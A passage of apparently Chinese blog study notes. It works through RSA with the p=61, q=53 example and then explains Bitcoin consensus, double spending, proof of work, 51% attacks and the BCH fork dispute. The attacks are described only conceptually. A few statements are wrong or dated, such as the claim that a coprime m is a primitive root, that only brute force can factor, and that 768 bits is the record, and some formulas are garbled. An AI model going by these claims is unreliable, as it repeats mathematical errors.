<li><p><strong>随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。</strong></p>
<p>在1到3120之间，随机选择e&#x3D;17。（实际应用中，常常选择65537。）</p>
</li>
<li><p>计算得出d， 使得d是e关于3120的模逆，得出d &#x3D; 2753（模逆可以使用Euclid扩展算法，证明略）</p>
</li>
<li><p><strong>将n和e封装成公钥，n和d封装成私钥。</strong> </p>
<p>在该例子中，n&#x3D;3233，e&#x3D;17，d&#x3D;2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。</p>
</li>
</ol>
<h4 id="RSA算法的可靠性"><a href="#RSA算法的可靠性" class="headerlink" title="RSA算法的可靠性"></a>RSA算法的可靠性</h4><p>回顾密钥生成过程一共出现了6个数字: $p&#x3D;61,q&#x3D;53,n&#x3D;3233,\varphi(n)&#x3D;3120,e&#x3D;17,d&#x3D;2753$</p>
<p>除了公钥的n和e,其余4个数字都是不公开的,在已知n和e的情况下能不能推出d?</p>
<ol>
<li>$e*d mod\varphi(n) &#x3D; 1$ 只有知道$e$和$\varphi(n)$,才能算出$d$,e已知,接下来只需求$\varphi(n)$</li>
<li>$\varphi(n)&#x3D;(p-1)(q-1)$,只有知道p和q才能算出$\varphi(n)$</li>
<li>$n&#x3D;p*q$ 只有将n因数分解才能算出p和q</li>
</ol>
<p><strong>结论：如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。</strong></p>
<p>可是，大整数的因数分解，是一件非常困难的事情。目前，除了暴力破解，还没有发现别的有效方法。p和q数字越大,破解难度越高,当然对应的加密解密时间也越长</p>
<p>例如:</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　12301866845301177551304949<br>　　　　　　　　　　　　　　　　58384962720772853569595334<br>　　　　　　　　　　　　　　　　79219732245215172640050726<br>　　　　　　　　　　　　　　　　36575187452021997864693899<br>　　　　　　　　　　　　　　　　56474942774063845925192557<br>　　　　　　　　　　　　　　　　32630345373154826850791702<br>　　　　　　　　　　　　　　　　61221429134616704292143116<br>　　　　　　　　　　　　　　　　02221240479274737794080665<br>　　　　　　　　　　　　　　　　351419597459856902143413</p>
</blockquote>
<p>它等于这样两个质数的乘积：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　33478071698956898786044169<br>　　　　　　　　　　　　　　　　84821269081770479498371376<br>　　　　　　　　　　　　　　　　85689124313889828837938780<br>　　　　　　　　　　　　　　　　02287614711652531743087737<br>　　　　　　　　　　　　　　　　814467999489<br>　　　　　　　　　　　　　　　　　　×<br>　　　　　　　　　　　　　　　　36746043666799590428244633<br>　　　　　　　　　　　　　　　　79962795263227915816434308<br>　　　　　　　　　　　　　　　　76426760322838157396665112<br>　　　　　　　　　　　　　　　　79233373417143396810270092<br>　　　　　　　　　　　　　　　　798736308917</p>
</blockquote>
<p>事实上，这大概是人类已经分解的最大整数（232个十进制位，768个二进制位）。比它更大的因数分解，还没有被报道过，因此目前被破解的最长RSA密钥就是768位。</p>
<h4 id="加密解密过程"><a href="#加密解密过程" class="headerlink" title="加密解密过程"></a>加密解密过程</h4><p><strong>（1）加密要用公钥 (n,e)</strong></p>
<p>假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p>
<p>所谓”加密”，就是算出下式的c：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^e ≡ c (mod n)$</p>
</blockquote>
<p>爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$65^{17} ≡ 2790 (mod 3233)$</p>
</blockquote>
<p>于是，c等于2790，鲍勃就把2790发给了爱丽丝。</p>
<p><strong>（2）解密要用私钥(n,d)</strong></p>
<p>爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c^d ≡ m (mod n)$</p>
</blockquote>
<p>也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$2790^{2753} ≡ 65 (mod 3233)$</p>
</blockquote>
<p>因此，爱丽丝知道了鲍勃加密前的原文就是65。</p>
<p>至此，”加密–解密”的整个过程全部完成。</p>
<p>我们可以看到，如果不知道d，就没有办法从c求出m。而前面已经说过，要知道d就必须分解n，这是极难做到的，所以RSA算法保证了通信安全。</p>
<p>你可能会问，公钥(n,e) 只能加密小于n的整数m，那么如果要加密大于n的整数，该怎么办？有两种解决方法：一种是把长信息分割成若干段短消息，每段分别加密；另一种是先选择一种”对称性加密算法”（比如<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B5%84%E6%96%99%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86">DES</a>），用这种算法的密钥加密信息，再用RSA公钥加密DES密钥。</p>
<h4 id="私钥解密证明"><a href="#私钥解密证明" class="headerlink" title="私钥解密证明"></a>私钥解密证明</h4><p>最后，我们来证明，为什么用私钥解密，一定可以正确地得到m。也就是证明下面这个式子：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c^d ≡ m (mod n)$</p>
</blockquote>
<p>因为，根据加密规则</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$ｍ^e ≡ c (mod n)$</p>
</blockquote>
<p>于是，c可以写成下面的形式：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$c &#x3D; m^e - k*n$</p>
</blockquote>
<p>将c代入要我们要证明的那个解密规则：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(m^e - k*n)^d ≡ m (mod n)$</p>
</blockquote>
<p>它等同于求证</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{e*d} ≡ m (mod n)$</p>
</blockquote>
<p>由于</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$e*d ≡ 1 (mod φ(n))$</p>
</blockquote>
<p>所以</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$e<em>d &#x3D; h</em>φ(n)+1$</p>
</blockquote>
<p>将ed代入：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{h*φ(n)+1} ≡ m (mod n)$</p>
</blockquote>
<p>接下来，分成两种情况证明上面这个式子。</p>
<p><strong>（1）m与n互质(如果m与n互质,则m是n的原根)。</strong></p>
<p>根据欧拉定理，此时</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{φ(n)}≡ 1 (mod n)$</p>
</blockquote>
<p>得到</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(m^{φ(n)})^h * m ≡ m (mod n)$</p>
</blockquote>
<p>原式得到证明。</p>
<p><strong>（2）m与n不是互质关系。</strong></p>
<p>此时，由于n等于质数p和q的乘积，所以m必然等于k*p或k*q。</p>
<blockquote>
<p>因为m与n不是互质关系，说明m与n有共同的公因子g，假设m&#x3D;hg，由于n&#x3D;pq，p与q互质，n只有p和q两个因子，所以g和h必然有一个等于q或者p， 所以才有结论“m必然等于kp或kq”</p>
</blockquote>
<p>以 m &#x3D; kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k*p)^{q-1} ≡ 1 (mod q)$</p>
</blockquote>
<p>进一步得到</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$[(k<em>p)^{q-1}]^{h(p-1)} *  k</em>p ≡ k*p  (mod q)$</p>
</blockquote>
<p>即</p>
<blockquote>
<p>　　　　　　　　$(k<em>p)^{e</em>d} ≡ k*p (mod q)$</p>
</blockquote>
<p>将它改写成下面的等式</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k<em>p)^{e</em>d} &#x3D; t<em>q + k</em>p$</p>
</blockquote>
<p>这时t必然能被p整除，即 t&#x3D;t’*p</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$(k<em>p)^{ed} &#x3D; t’<em>p</em>q + k</em>p$</p>
</blockquote>
<p>因为 m&#x3D;kp，n&#x3D;pq，所以</p>
<blockquote>
<p>　　　　　　　　　　　　　　　　$m^{e*d} ≡ m (mod n)$</p>
</blockquote>
<p>原式得到证明。</p>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>数字签名</p>
<h3 id="ECC椭圆曲线加密"><a href="#ECC椭圆曲线加密" class="headerlink" title="ECC椭圆曲线加密"></a>ECC椭圆曲线加密</h3><p>RSA算法是当前使用最广的非对称加密算法。但是RSA的缺点在于为了抵抗攻击，不得不增加公钥的长度。而随着长度的增加，计算量和复杂度也不断增加。正是因为非对称加密复杂度太高，所以一般仅用于在网络连接建立时的密钥协商过程。而且随着数字大小的增加，分解的效率会提高，乘法和分解的难度差距会减小。</p>
<p>所以RSA并不是将来密码学中最理想的系统。在理想的trapdoor函数中，正向计算（简单的计算）和反向计算（复杂计算）的难度应该随着数字的增加同步地增加。 所以需要更好的trapdoor函数。</p>
<h3 id="非对称加密在区块链中的应用"><a href="#非对称加密在区块链中的应用" class="headerlink" title="非对称加密在区块链中的应用"></a>非对称加密在区块链中的应用</h3><p>具体实现:</p>
<ol>
<li>首先生成一对公私钥 (pk,sk)。 pk是公钥，sk是私钥。</li>
<li>签名sign。sig &#x3D; sign(sk, message) ,使用私钥对一份消息message进行处理，譬如先对message进行哈希得到摘要，然后使用私钥对摘要进行加密。</li>
<li>验证verify。 verify(pk, message, sig)。验证方法，获得输入message，签名的结果sig，以及公钥。譬如，可以使用公钥对签名结果进行解密，对message进行同样散列得到的摘要，比较解密的结果和摘要结果，如果两个相同，这验证通过，否则，验证失败。</li>
</ol>
<h1 id="区块链技术6-去中心化"><a href="#区块链技术6-去中心化" class="headerlink" title="区块链技术6:去中心化"></a>区块链技术6:去中心化</h1><p>去中心化问题:分布式一致性性问题</p>
<p>分布式好处是更加可靠</p>
<p>对于去中心化，比特币区块链主要面临的五个问题：</p>
<ol>
<li>谁维护交易账本？</li>
<li>谁能决定交易是否是有效的？</li>
<li>谁创建新的比特币？</li>
<li>谁决定系统变化的规则？</li>
<li>比特币如何获得交易的价值？</li>
</ol>
<h2 id="分布式共识（distributed-consensus"><a href="#分布式共识（distributed-consensus" class="headerlink" title="分布式共识（distributed consensus)"></a>分布式共识（distributed consensus)</h2><p>给出分布式共识协议的一个定义和描述：</p>
<p>有 n 个节点，每个节点都有输入值。有一些节点出故障或者是恶意的。分布式共识协议的特点是：</p>
<ul>
<li>必须能够使得所有的诚实节点就输入值达成一致</li>
<li>该最终一致的值是由诚实节点产生的</li>
</ul>
<h2 id="区块链共识算法"><a href="#区块链共识算法" class="headerlink" title="区块链共识算法"></a>区块链共识算法</h2><p>在区块链中，一次交易可能是Alice从Bob那里买了一本书，或者是其它物品，这可以线下商议，然后Alice需要支付给Bob一个比特币。在比特币网络中，Alice需要广播一条消息，譬如“Alice支付给Bob 1个比特币。”并且使用私钥对消息进行签名。</p>
<p>现在的问题是，Bob如何能确认，自己确实能够收到这个比特币，然后将Alice购买的物品发给她。</p>
<p>比特币系统的特殊之处在于：</p>
<ol>
<li>引入了激励机制。因为比特币本身就是一种货币，所以参与者有强烈的意愿能获得这个奖励。也就是说，维持整个系统正常工作才符合大多数人的利益。</li>
<li>比特币的随机性。比特币网络中的共识并不是一下子就确定的，在实际中，差不多是一个小时之后，基本可以认为对一个区块或者一笔交易进行了确认。但是，即使在这个时候，也还不能确认100%。而是，随着时间的流逝，确认性会逐渐增强。</li>
</ol>
<p>比特币网络实现的是<strong>隐含共识</strong>（implicit consensus）：一个区块就是一个共识的过程，随机的节点可以提出新区块。即使提出新区块的节点是恶意的，提出时也没有显示的投票或者其他过程。建立共识的过程是隐式的，其它节点如果接受这个区块，就会延伸它；否则拒绝这个区块，则会无视它，并尝试建立新区块去取代它。</p>
<p>简化的比特币的共识算法过程如下：（这里没有讨论广播新区块的节点是如何选出的）</p>
<ol>
<li>向所有的节点广播新的交易。</li>
<li>每个节点将新交易打包进区块。</li>
<li>每一轮中一个随机的节点广播该区块。</li>
<li>如果区块中所有的交易都是有效的（比特币没有重花，签名正确等），则其他节点接受这个区块；</li>
<li>节点表示接受该区块的方式是在之后新创建的区块中包括这个块的哈希。</li>
</ol>
<p>针对这个算法讨论一下在货币网络中可能的攻击方法。</p>
<ol>
<li>偷比特币。Alice有没有可能去使用其他用户的比特币呢？譬如Alice创建了一个区块，区块中她试图伪造一个交易“Bob发送10个比特币给Alice。”如果要让这个交易合法，那么Alice必须能够伪造Bob的签名，但是Alice如果没有Bob的私钥，那么Alice就不能伪造签名。所以，只要底层的密码学基础没有被破坏，Alice就不可能偷Bob的币。</li>
<li>拒绝服务。如果Alice非常讨厌Bob，她不愿意为Bob提供服务，譬如在自己创建的区块中，Alice就会故意忽略掉Bob相关的交易。这个攻击的问题是，Alice并不能控制区块的产生。即使Alice在一个区块中忽略了Bob的交易，其他诚实的节点会在交易中包括Bob的交易。</li>
<li>双重支付。假设Alice从Bob购买了一个软件，然后她广播了一条交易“Alice付给Bob一些比特币”。诚实的节点看到了这条交易，并且将交易包含在区块中。当Bob看到这条交易被包括进去的时候，Bob认为Alice已经支付了，所以将软件发送给了Alice。然后Alice开始准备攻击，她自己或者她控制的节点开始准备下一个区块，在这个区块中包含的消息是把Alice刚才付给Bob的币付给自己或者她控制的账号“Alice付给Alice一些比特币”。如果Alice能够给成功地将第二条支付信息包含在区块链中，那么第一条消息，将会被忽视，就像从来没有出现过一样。</li>
</ol>
<p>下面是双重支付的示例图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233997.jpg" alt="img"></p>
<p>Alice可以构造一个新的交易，将支付给Bob的钱再支付给自己。如果她能控制后续区块的产生，那么付给Bob的交易会像从来没有存在过一样。</p>
<p>问题是，双重攻击能否成功，完全取决于区块链到底沿着那条链延续。诚实的节点会沿着最长的链创建自己的区块。所以答案就是，没有正确的答案。</p>
<p>在Alice创建了双重攻击的区块之后，对于其他的节点而言，两个分支具有一样的长度；而且两个块都是有效的，那么其他节点会选择哪个分支就决定了攻击成功与否。但是对于其他的节点而言，这两个交易的地位是完全相同的。我们认为Alice付给自己的交易是欺骗，那是因为我们知道Alice首先付给了Bob。但是，对于没有全局时间的网络而言，这两个交易是等价的。而且Alice还可以通过一些方法使得下一个区块沿着自己的分支延伸。</p>
<p>那么Bob如何应对这个问题呢？</p>
<p>如果Bob容易轻信，那么他可能在发现Alice发布了付币给自己的时候就同意将软件发给Alice，这个时候，称作Zero-Confirmation Transaction（零确认交易）。如果Bob有更多的保护自己的意识，他会等到Alice付钱给自己的交易被多次确认之后才将软件发给Alice。当交易被包含在区块中，称作一次确认；如果包含交易的区块之后又来了一个区块，称作2次确认。以此类推。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233998.jpg" alt="img"></p>
<p>只要Bob等足够的时间，那么当他发现包含Alice付钱给自己的区块已经被遗弃的时候，他会放弃这次交易并且拒绝将软件发给Alice。一般而言，一个交易获得的确认越多，这个交易成为最终的系统的共识的概率越大。</p>
<p>在比特币系统中的一般做法是等6个确认。6是在等待时间和确认之间的一个折中。</p>
<p>综上，能够防止双重支付成功的原因，也即，包括双重支付的区块不能最终包括在链中的原因是我们假设大部分的节点是诚实的。从密码学的角度，两个交易都是正确的。 所以，为了确认形成了共识，需要等待一段时间，确定最终区块链中到底包含了哪一个块。而且，随着区块的增加（确认数的增加），交易变无效的可能性是指数级降低的。因此，可以等待6个区块，也即差不多1个小时的时间，基本上不会再翻盘了。</p>
<p>激励和工作证明（PoW）</p>
<p>在之前的过程中，我们多次做了假设，大部分的节点是诚实节点——诚实的节点会将自己收到的广播的交易打包，诚实的节点会沿着最长的分支扩展。但是，节点有没有必要保持诚实呢？或者说，能不能给节点激励，让节点维持诚实？</p>
<p>实际上，即使能够证明有的节点正在尝试进行双重支付攻击，因为节点没有标识，所以即使发现，也不能进行惩罚。所以，问题变成了，如果节点保持诚实，能不能获得奖励？同样的，因为如果节点没有身份标识，不可能寄支票给诚实的节点，所以，对诚实的形成区块的节点的奖励就是比特币。</p>
<p>在比特币网络中，共有两个激励方式。一种是Block reward（区块奖励），一种是transaction fees（交易费用）。</p>
<p>区块奖励是这样的，任何创造出区块的节点可以在区块中包括一个特殊的交易——创造币的交易，并且节点可以选择交易的接收地址。当然， 节点大概率把接收地址设置为自己。可以理解为这是对节点创造区块的奖励。</p>
<p>目前为止，创造一个区块的奖励是25个币，然后每210,000个区块这个数字会减半。按照生成区块的速度，差不多每四年，区块奖励会减半。</p>
<p>第一眼看来，这个好像没什么用处。因为，不管节点创造的是好的区块还是包括攻击交易的区块，他都能获得奖励。但是，这个奖励什么时候才有用呢？只有在他的区块被包括在长链中才行。因此，如果一个区块中包括无效的交易，这个区块相当于会被丢弃。所以，所有的节点都能尽力表现得诚实，这样，其他节点才会沿着他的区块继续添加新的区块。</p>
<p>同时，区块奖励也是唯一的创建新的比特币的方法。从下图可以看出，每四年比特币的区块奖励降低一半，比特币系统中币的总数设置在21,000，000。也即，总有一天，创建区块不会产生新的币，或者币回报太少，而没有人愿意去创建区块。</p>
<p>那个时候，会不会产生欺诈呢？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233999.jpg" alt="img"></p>
<p><strong>交易费用。</strong>比特币中的第二个激励机制是交易费用。交易的创建者可以在创建交易时，输入大于输出，其中的差值就是交易费用。所以，即使当创建区块不会产生币的时候，交易费用会变得很重要。同时，对于交易者而言，如果希望自己的交易被快速地确认，毫无疑问地，在交易中包括多一点的费用是一个好的方法。</p>
<p>这时候，来理一下思路。</p>
<ol>
<li>我们要求创造新区块的节点是随机的。</li>
<li>我们给创造区块的节点奖励，那样会有很多节点希望参与。</li>
<li>从前两点还会引出的问题是：会不会有节点发动女巫攻击，创造很多的节点以获得奖励？</li>
</ol>
<p>所有三个问题的答案实际上是一个PoW，proof of work。基本思路就是，挑选节点的时候，要根据一种人们不能独占的资源来选择，譬如，算力，computer power。在PoW中，就是让节点进行竞争，算力最强能够胜出，也相当于是按照算力按比例进行选择。</p>
<p>从另一方面来讲，这对希望参与的节点设置了门槛，必须有足够的算力资源才能参与到区块的创建中。因此，即使有人想发动Sybil Attack，如果不能控制更多的算力，创建新的节点是没有用的。</p>
<p>比特币的工作证明就是hash puzzles。为了创建一个区块，节点需要能够找到一个数值，nonce，使得当计算哈希时，前一个hash，包含在区块中的交易，以及nonce这三者连接之后，它的哈希值小于某个target。</p>
<p>用公式写出来，长这样：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233000.jpg" alt="img"></p>
<p>之前我们讲过hash具有的特点是puzzle friendliness，找到这个Nonce的唯一方法就是尝试各种值，直到运气好找到一个。</p>
<p>工作证明的存在基本上实现了对随机性的要求，没有谁能够指定哪个节点可以产生下一个区块；同时，排除了Sybil Attack的可能，创建有竞争力的节点代价太高。</p>
<p>比特币中的hash计算有三个特点。</p>
<ol>
<li>很难计算。在2014年，产生一个区块需要的计算大概是 10^20 次哈希。面对这样的计算量，普通的笔记本电脑根本没有竞争力。也因此，参与计算的行为被称作mining，挖矿。</li>
<li>难度可调节。难度调整逻辑被写在代码中，在每个全节点中独立自动发生。每2016个块，所有的节点一起参与计算，重新定义target。target的目标是，使得每隔10分钟才能产生一个新区块。按照这个速度，每两周，target重新定义一次。这也意味着，随着整个系统的算力增加， 创建一个区块会越来越难。为什么需要10分钟创建一个区块呢？如果不自动调整target，随着算力的增加，创建区块的速度会越来越快，可能打包的交易会变少。当然，速度太慢就不适合一些吞吐量大的服务。所以最佳速度一直是个问题。</li>
<li>验证非常容易。</li>
</ol>
<p>也正是因为工作量证明，保证了如果大部分的节点（以算力而不是个数）是诚实的，那么至少有50%的可能，下一个区块来自于诚实的节点。</p>
<p>总结：</p>
<p>每个人都可以参与比特币协议，而且不需要现实世界的身份，只要创建一对公私钥对就行。而且可以创建任意多的公私钥。交易实际上就是在网络中广播的信息。比特币就是交易的输出。（比特币的最小单位是0.00000001，单位为1聪Satoshi）比特币网络的目标是将交易和新区块向全网广播，网络通过区块链和共识机制保障安全。当我们说交易包括在区块链中，实际上是这个交易获得了多次的确认。</p>
<p>最后，讨论一下51%攻击。</p>
<p>因为之前的假设一直是大部分的节点是诚实的，也就是至少51%的节点是诚实的。那万一攻击者控制了51%的节点呢？或者说，有一个超级强大的矿池，控制了51%的算力呢？</p>
<p>我们来思考一下，此时攻击者可能发起什么攻击。</p>
<p>攻击者可能偷别人的比特币吗？不能。除非能破解密码基础，否则不可能偷到别人的币。如果攻击者想在区块中包括这个签名不正确的币，那么即使有51%的算力控制，也不可能推翻共识机制。即使攻击者创造出了最长的链，但是剩下的其他诚实节点会拒绝接受这条链，而会自己创造另一条链，也就是出现了分叉。当攻击者想把偷来的币花出去时，接收方也会因为不选择攻击者创造的链而拒绝这个交易。</p>
<p>攻击者能不能进行DoS攻击？如果攻击者特别不喜欢Bob，那么确实有可能Bob的交易不会出现在所有的区块中。但是，Bob的交易可以被广播到网络中，所以，即使Bob确实是拒绝服务了，但是至少对于诚实节点而言，能够发现攻击发生了。</p>
<p>最后，能否进行双重支付等其他可以破坏区块链信任的攻击呢？在51%的算力控制下，确实有可能。但是那个时候，一旦人们发觉到比特币网络被人控制，而不再可信，那么人们会主动放弃比特币，那么比特币的价值会直接崩溃。而攻击者呢，考虑到控制51%算力的代价，出现这种情况就相当于所有的投资都会打水漂。</p>
<hr>
<p>来看一下魔幻现实。</p>
<p><strong>比特大陆</strong>，混过币圈或者挖过矿的都知道，<strong>他们是世界上最大的矿机生产商，拥有世界上最大的矿池以及矿场</strong>。是比特币世界的巨无霸。比特大陆的算力到底有多大呢？通过下面的全球算力图来简单分析一下。【下图是2017年11月的时候】</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233001.jpg" alt="img"></p>
<p><a href="https://link.zhihu.com/?target=http://BTC.com">http://BTC.com</a>和AntPool是比特大陆的矿池，这点已毋庸置疑，两者相加已经占全球算力的32.37%。而ViaBTC有比特大陆的投资，BTC.TOP则是江卓尔的，他们与比特大陆基本同仇敌忾。**这4个矿池在图上明眼一看就知道超过了51%。它们相加算力占比达到了62.28%**，还不算其它联盟的算力以及云算力等。</p>
<p><strong>Core团队</strong>这边呢？他们说起来比较像一群极客，<strong>多年来维护维护着比特币这个开源项目，同样也维护者中本聪当年去中心化的思想</strong>。所以Core在商业和挖矿方面并没有太大建树，但是<strong>在国外的社区里一直拥有极高的声誉</strong>。</p>
<p>以比特大陆为代表的大矿工群体，垄断了绝大多数算力。而开发团队Bitcoin Core，则控制了比特币代码的更新权。双方围绕着比特币是否需要扩容的话题，展开了一轮又一轮口水战。</p>
<p>由于比特大陆的力量越来越大，渐渐就影响到了比特币未来的发展路线。两个BOSS一个是在极客世界维护着比特币代码和去中心化思想，而另一个则是带有非常浓厚的商业行为的公司。两者难免在一些事情上声音不同。</p>
<p>BCH（比特现金），这是长达三年扩容争议的产物，是以矿霸比特大陆为核心主导的一次分叉，导致比特币社区在2017年下半年分裂。在比特币网络拥堵的背景下，比特现金主张走大区块路线，号称有更高性能，更高的容量，更低的交易手续费用，正式和比特币展开竞争。</p>
<p>竞争初期，因为有以比特大陆为代表的大矿工群体支持，比特现金似乎看起来有越位比特币之势，其兑换比特币的比例一度达到0.4（1个比特币现金可以兑换到0.4比特币）。</p>
<p>BCH诞生时，币市仍处牛市。分叉带来的恐慌，很快便被牛市的狂热所淹没。而BSV分家时，币圈正值熊市——一个月时间，BCH币价由分叉前的552美元，一路狂泻至74美元，跌去83%。即便计入分叉后产生的BSV，投资者依然损失惨重。</p>
<h4 id="分叉币"><a href="#分叉币" class="headerlink" title="分叉币"></a>分叉币</h4><p>莱特币、狗狗币这些竞争币种，都是独立建立数据，和比特币分离。而BCH、BTG、BCD和比特币共用某个时间节点之前的数据，两者的本质差别在这，共用数据导致，某个时间节点之前持币的用户，自动同时持有两种币。因为用户关注的是持币问题，所以前者不被称为分叉币，而后者被称为分叉币。除了比特币，以太坊ETH目前也有一种分叉币存在，即ETC。</p>
<p>分叉币从软件技术上，“复制并修改”，修改一行代码也是修改，修改100行代码也是修改，本质上是一个意思。从技术上看，不存在正宗不正宗的问题。</p>
<p>同样是硬分叉，另外一种情况，B版本得到广泛支持，而A版本被大面积停用，那么B版本就会继承这个币种正宗的称号，而A版本反而会被改名换姓叫另外一个名字，这都是约定成俗的，没有一个中心化的规定。比如以太坊ETH硬分叉后，作为新版本的B版本还是被大家称为ETH，而A版本被大家改称为ETC。</p>
<p>在A版本仍然得到绝大部分支持的情况下，上面的B1、B2、B3版本为什么能活？也是基于相同的这两点前提，第一点，这些一小撮人搞的B版本，统统修改了难度系数和算法，所以不会十万分钟才出块数据；第二点，这一小撮人技术虽然都是抄的，但是他们专注做了一系列的市场推广，上线交易所等等。</p>
<p>现在分叉就变成了四种情况（结果）：</p>
<p>1、A版本仍然被广泛支持，B版本算力不足消亡，只保留A版本。</p>
<p>2、B版本被广泛支持，A版本算力不足消亡，只保留B版本。</p>
<p>3、A版本和B版本都有相当一部分支持，同时并存。这种情况是最符合严格意义上的硬分叉。这两者是货真价实的分叉币。有一定的门槛（支持率）。到目前为止比特币没有一种这种分叉币产生。</p>
<p>4、A版本仍然被广泛支持，B版本通过代码修改难度系数和算法，一小撮人也能够让它存活下来。这种B版本的分叉币是几乎没有门槛的，到目前为止，这种分叉币几个月内就出来三五种，而且好像还在不断增加（有利可图）。大部分理解比特币的人，把这一类分叉跟其他一千多种竞争币进行等同看待，在国外的一些交易所把BCH称为bcash币而不是bitcoin cash。</p>
<p>根据虎嗅网的报道，</p>
<p><a target="_blank" rel="noopener" href="https://www.huxiu.com/article/311309.html">比特币分叉往事</a></p>
<blockquote>
<p>2018年1月13日，比特币市值占整个加密币市场的份额跌至32.45%，创下历史新低。当时很多人都以为<strong>比特币被取代是早晚的事</strong>。<br>对于吴忌寒来说，算力是最大的优势和武器，他希望他主导的分叉币BCH能够取代BTC。<br>但BTC占据了比特币的正统及冠名权，还有9年用户累积与行业生态。<strong>BCH诞生之后，一直面临着一个严峻的挑战，就是没有人认可。</strong><br>再加上Bitcoin Core阵营的反对和大部分行业公司保持观望中立，在BTC分叉后，大部分BCH被用户当成糖果抛售，BCH价格刚出来只有200多美元。<br>分叉后，<strong>吴忌寒一方面通过拉高BCH价格吸引矿工过来挖BCH，另一方面不断抛售BTC，造成BTC价格不稳定</strong>，最终：“很多矿工就会选择继续挖BCH，从而导致比特币算力减少，网络更加拥堵，更多人信心丧失抛售比特币，最后矿工更加转移到BCH，形成恶性循环，导致比特币的崩盘”。<br>于是吴忌寒第一次进攻选择了拉盘。<strong>BCH的价格一路走高，分叉后不到二十天，8月20号价格就猛涨到898美元，翻了三倍多</strong>。矿工们看到BCH有利可图，再加上BTC的算力缩小，交易更拥堵；越来越多的人开始转投BCH，而这进一步导致BCH价格升格，就这样不断循环，BCH价格一路走高。<br>接着吴忌寒第二次进攻开始抢夺比特币的算力。极端情况下，BCH分流了BTC的接近一半的算力，让比特币链上的交易大幅拥堵。然而在11月，BCH算力达到了BTC的两倍，价格仍只有比特币的三分之一，最后BCH算力迅速崩溃再也没超过比特币。</p>
</blockquote>
<h1 id="区块链技术7-比特币的机制-1"><a href="#区块链技术7-比特币的机制-1" class="headerlink" title="区块链技术7:比特币的机制(1)"></a>区块链技术7:比特币的机制(1)</h1><p>比特币的共识机制生成了一个append-only的账本，一旦交易在账本中，再也不能更改。矿工——也即一些有较高计算力的节点，生成区块，并且验证交易是正确的（签名是正确的、币没有重复花费）等。账本和区块链网络使得比特币成为一种货币。在本文中，将介绍一些细节。</p>
<h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><p>区块链实际上就是一个账本，账本就是要记账，账实际就是一笔笔的交易。那首先看一下，使用下面的记账形式效果如何。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233002.jpg" alt="img"></p>
<p>第一个交易是形成区块的奖励25个比特币。Alice将17个币转给Bob，Bob转8个给Carol，Carol转5个给Alice，然后Alice转15个给David。这种记账方式非常符合我们的直觉，因为现实生活中，支付宝、微信、银联都是这么做的。但是这种做法的优缺点是什么？</p>
<p>上面的例子中，前面的几笔交易我们可能都看的很顺，因为根据之前交易的情况，我们很容易判断出交易能够顺利进行。但是看到最后一笔交易的时候就得想一下，Alice有这么多钱支付给David吗？</p>
<p>这种形式的账本也叫作account-based账本，这种记账方式的问题是：必须对每个账户的余额进行查询，才能确定一笔交易是否有效。譬如在最后一个交易的时候，得去查一下Alice的账户，总共还有多少币剩余。像上面的例子中，如果没有全局的数据结构维护用户的余额，那么可能得一路追踪回去到起始交易，看看Alice到底剩多少钱。如果想要快一点，那就得额外地维护数据结构，譬如有一个全局的数据结构，在每次交易后更新账户余额。</p>
<p>由于这样的问题，比特币并没有使用这样account-based的记账方法。比特币的记账方式是类似于这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233003.jpg" alt="img"></p>
<p>每一笔交易指明了输入和输出，每一笔交易有唯一的标识符，每一笔交易可以有多个输入和多个输出。上面的例子做了简化，使得可以方便地使用序号来指代交易。</p>
